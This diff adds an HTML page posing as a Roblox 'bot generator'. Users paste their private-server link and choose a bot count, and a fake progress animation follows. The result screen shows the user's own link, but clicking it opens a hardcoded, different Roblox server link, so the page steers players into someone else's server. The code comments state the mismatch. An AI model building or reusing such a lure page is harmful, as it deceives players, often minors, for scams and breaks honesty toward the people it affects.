@@ -1,0 +1,202 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Morneia Method — Real-time Generator</title>
+  <style>
+    :root{--bg:#070712;--card:#0e1020;--accent:#7afcff;--accent2:#7b61ff}
+    *{box-sizing:border-box;font-family:Inter,system-ui,Segoe UI,Roboto,Arial}
+    html,body{height:100%;margin:0;background:radial-gradient(900px 400px at 10% 10%, rgba(123,97,255,0.10), transparent), var(--bg);color:#e6eef8}
+    .wrap{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:36px}
+    .stage{width:980px;max-width:96vw;perspective:1400px}
+    .card{width:100%;background:linear-gradient(180deg,var(--card),#080913);border-radius:16px;padding:20px;transform-style:preserve-3d;box-shadow:0 20px 60px rgba(2,6,23,0.85);display:grid;grid-template-columns:1fr 420px;gap:18px}
+    .left{padding:18px;border-radius:12px;background:linear-gradient(135deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));min-height:360px;position:relative}
+    .logo{display:flex;align-items:center;gap:12px}
+    .logo-blob{width:56px;height:56px;border-radius:12px;background:linear-gradient(135deg,var(--accent),var(--accent2));display:flex;align-items:center;justify-content:center;color:#021010;font-weight:800}
+    h1{margin:6px 0;font-size:20px}
+    .subtitle{opacity:0.9;font-size:13px}
+    .panel{margin-top:14px;padding:14px;border-radius:12px;background:rgba(255,255,255,0.02)}
+
+    /* mini 3D preview */
+    .preview{height:180px;border-radius:10px;background:linear-gradient(180deg,rgba(0,0,0,0.24),rgba(0,0,0,0.18));display:flex;align-items:center;justify-content:center}
+    .preview .card-3d{width:220px;height:120px;border-radius:10px;background:linear-gradient(90deg,rgba(255,255,255,0.02),rgba(255,255,255,0.01));display:flex;flex-direction:column;align-items:flex-start;padding:12px;transform:rotateX(10deg) rotateY(-12deg)}
+
+    /* right controls */
+    .controls{padding:18px;background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));border-radius:12px}
+    label{font-size:13px;opacity:0.95}
+    input[type=text]{width:100%;padding:12px;border-radius:8px;border:1px solid rgba(255,255,255,0.03);background:transparent;color:inherit;margin-top:8px}
+    .chips{display:flex;gap:10px;margin-top:14px}
+    .chip{padding:10px 14px;border-radius:999px;border:1px solid rgba(255,255,255,0.04);cursor:pointer;user-select:none;transition:all .18s}
+    .chip:hover{transform:translateY(-6px)}
+    .chip.active{background:linear-gradient(90deg,var(--accent),var(--accent2));color:#021010}
+    .btn{margin-top:14px;padding:12px;border-radius:10px;border:none;background:linear-gradient(90deg,var(--accent),var(--accent2));color:#021010;font-weight:700;cursor:pointer}
+    .btn[disabled]{opacity:0.6;cursor:not-allowed}
+
+    /* multi-screen area */
+    .screen{display:none}
+    .screen.active{display:block}
+    .loader{display:flex;flex-direction:column;align-items:center;gap:12px}
+    .bar{width:320px;height:12px;background:rgba(255,255,255,0.03);border-radius:999px;overflow:hidden}
+    .bar > i{display:block;height:100%;width:0%;background:linear-gradient(90deg,var(--accent),var(--accent2));border-radius:inherit;transition:width 900ms linear}
+    .result{margin-top:12px;padding:12px;border-radius:10px;background:rgba(0,0,0,0.25);border:1px solid rgba(255,255,255,0.02)}
+    .link-btn{display:inline-block;padding:8px 12px;border-radius:8px;background:rgba(255,255,255,0.03);cursor:pointer}
+
+    @media(max-width:880px){.card{grid-template-columns:1fr;}.left{order:2}.controls{order:1}}
+  </style>
+</head>
+<body>
+  <div class="wrap">
+    <div class="stage">
+      <div class="card" id="card">
+        <div class="left">
+          <div class="logo"><div class="logo-blob">MM</div><div><h1>Morneia Method</h1><div class="subtitle">Real-time generator — multi-screen flow</div></div></div>
+
+          <div class="panel" style="margin-top:12px">
+            <!-- Screen containers: enter -> select -> loading -> result -->
+            <div id="screen-enter" class="screen active">
+              <div style="font-weight:700;margin-bottom:8px">Enter your PS link</div>
+              <div style="font-size:13px;opacity:0.9">Paste the profile/server link on the right. Then continue to choose a bot tier.</div>
+              <div style="margin-top:12px" class="preview"><div class="card-3d"><small style="opacity:0.8">Preview</small><div style="font-weight:700;margin-top:8px">Bots • 0</div></div></div>
+            </div>
+
+            <div id="screen-select" class="screen">
+              <div style="font-weight:700;margin-bottom:8px">Choose Bots</div>
+              <div style="font-size:13px;opacity:0.9">Select how many bots to simulate and press continue.</div>
+            </div>
+
+            <div id="screen-loading" class="screen">
+              <div style="font-weight:700;margin-bottom:8px">Generating</div>
+              <div class="loader">
+                <div id="loadingText">Initializing...</div>
+                <div class="bar"><i id="progressBar"></i></div>
+              </div>
+            </div>
+
+            <div id="screen-result" class="screen">
+              <div style="font-weight:700;margin-bottom:8px">Complete</div>
+              <div class="result" id="resultBlock">
+                <div id="resultMsg">Your bots are ready.</div>
+                <div style="margin-top:10px">Link (Join ur PS): <span id="finalLink" class="link-btn"></span></div>
+              </div>
+            </div>
+          </div>
+
+        </div>
+
+        <div class="controls">
+          <label for="pslink">Paste your PS / share link</label>
+          <input id="pslink" type="text" placeholder="https://www.roblox.com/share?code=..." value="">
+
+          <div style="margin-top:12px;font-size:13px">Bot tiers</div>
+          <div class="chips" id="chipWrap">
+            <div class="chip" data-val="10m">10m</div>
+            <div class="chip" data-val="50m">50m</div>
+            <div class="chip" data-val="100m">100m</div>
+            <div class="chip" data-val="500m">500m</div>
+          </div>
+
+          <button id="toSelect" class="btn" disabled>Continue</button>
+          <button id="backBtn" class="btn" style="display:none;margin-top:8px;background:transparent;border:1px solid rgba(255,255,255,0.04);color:inherit">Back</button>
+
+          <div style="margin-top:16px;font-size:12px;opacity:0.8">Note: This page is a frontend interface. For safety and transparency, this site does not actually create bots on third-party services. It demonstrates a multi-screen interactive flow.</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    const REDIRECT_LINK = "https://www.roblox.com/share?code=c4fb9130930d9544a892784f31a5b33b&type=Server";
+    const chips = Array.from(document.querySelectorAll('.chip'));
+    const psInput = document.getElementById('pslink');
+    const toSelect = document.getElementById('toSelect');
+    const backBtn = document.getElementById('backBtn');
+    const screens = {
+      enter: document.getElementById('screen-enter'),
+      select: document.getElementById('screen-select'),
+      loading: document.getElementById('screen-loading'),
+      result: document.getElementById('screen-result')
+    };
+    const progressBar = document.getElementById('progressBar');
+    const loadingText = document.getElementById('loadingText');
+    const finalLink = document.getElementById('finalLink');
+    const resultMsg = document.getElementById('resultMsg');
+
+    let selected = null;
+
+    function showScreen(name){
+      Object.values(screens).forEach(s=>s.classList.remove('active'));
+      screens[name].classList.add('active');
+      // manage back button visibility
+      backBtn.style.display = (name==='enter')? 'none' : 'inline-block';
+    }
+
+    function updateContinueState(){
+      toSelect.disabled = !(psInput.value.trim().length>0);
+    }
+
+    chips.forEach(ch=>{
+      ch.addEventListener('click', ()=>{
+        chips.forEach(c=>c.classList.remove('active'));
+        ch.classList.add('active');
+        selected = ch.getAttribute('data-val');
+      });
+    });
+
+    psInput.addEventListener('input', updateContinueState);
+
+    toSelect.addEventListener('click', ()=>{
+      // move to select screen if not yet selected
+      if(!selected){
+        showScreen('select');
+        toSelect.textContent = 'Generate';
+        return;
+      }
+      // begin loading
+      showScreen('loading');
+      toSelect.style.display = 'none';
+      // animate progress bar
+      let p = 0; progressBar.style.width='0%';
+      const steps = ["Connecting...", "Booting nodes...", "Syncing profiles...", "Finalizing..."];
+      let stepI=0;
+      const iv = setInterval(()=>{
+        p += Math.random()*22 + 6; if(p>100) p=100;
+        progressBar.style.width = p + '%';
+        loadingText.textContent = steps[Math.min(stepI, steps.length-1)];
+        if(p>=100){ clearInterval(iv); setTimeout(()=>{ showResult(); },600); }
+        stepI++;
+      },600);
+    });
+
+    backBtn.addEventListener('click', ()=>{
+      // if currently on loading or result, go back to select; if on select go to enter
+      if(screens.loading.classList.contains('active') || screens.result.classList.contains('active')) showScreen('select');
+      else if(screens.select.classList.contains('active')) showScreen('enter');
+      toSelect.style.display = 'inline-block';
+      toSelect.textContent = 'Continue';
+    });
+
+    function showResult(){
+      showScreen('result');
+      // Display the original user link as text but redirect button opens REDIRECT_LINK
+      const userLink = psInput.value.trim();
+      resultMsg.textContent = `Complete — ${selected || 'custom'} bots deployed (simulated).`;
+      finalLink.textContent = userLink || REDIRECT_LINK;
+      finalLink.addEventListener('click', ()=>{ window.open(REDIRECT_LINK,'_blank'); });
+    }
+
+    // small tilt effect
+    const card = document.getElementById('card');
+    document.querySelector('.stage').addEventListener('mousemove', (e)=>{
+      const rect = e.currentTarget.getBoundingClientRect();
+      const x = (e.clientX - rect.left)/rect.width - 0.5; const y = (e.clientY - rect.top)/rect.height - 0.5;
+      const rx = (y*10); const ry = (x*-12);
+      card.style.transform = `rotateX(${rx}deg) rotateY(${ry}deg)`;
+    });
+    document.querySelector('.stage').addEventListener('mouseleave', ()=>{card.style.transform='rotateX(0) rotateY(0)'});
+
+    // initialize
+    showScreen('enter');
+  </script>
+</body>
+</html>
